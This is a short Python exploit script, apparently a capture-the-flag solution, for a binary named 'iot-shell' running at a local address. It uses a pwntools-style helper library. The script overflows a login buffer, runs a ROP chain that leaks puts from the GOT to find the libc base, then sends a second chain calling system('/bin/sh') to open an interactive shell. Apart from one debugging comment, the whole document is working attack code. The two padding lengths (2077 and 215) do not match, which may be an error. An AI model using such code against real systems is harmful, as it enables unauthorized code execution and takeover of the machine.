from evilblade import *

setup("./iot-shell")
libset("./libc.so.6")
# libset("/usr/lib/libc.so.6")
rsetup("127.0.0.1", 21097)
evgdb("b *0x401820")
#debug的时候，可以使用set follow-fork-mode parent来避免进入子进程
# context(os='linux', arch='mips', log_level='debug')

puts = sym("puts")
got = got("puts")
sys = sym("system")
main = sym("main")
ret = gg("ret",0)
# rdi = gg("mov rdi, rbp",0)# mov rdi, rbp ; nop ; pop rbp ; ret
rdi = gg("pop rdi",0)

rop1 = rop64([rdi, got, puts, main])
# payload = cyclic(207) + p64(got) + p64(rdi) + p64(puts)*2 + p64(main)
payload = cyclic(2077) + rop1

sl(b"login")
sl(payload)
# sl(mouse)

# pause()
ru("CheckLogin...")
tet()
puts_real = getx64(0,-1)
libcbase = getbase(puts_real,"puts")
sh = string("/bin/sh", libcbase)
rop2 = rop64([rdi, sh, ret, sys, main])

# payload = cyclic(207) + p64(sh) + p64(rdi) + p64(ret)*2 + p64(sys) + p64(main)
payload = cyclic(207+8) + rop2
sl(b"login")
sl(payload)
congra()
ia()

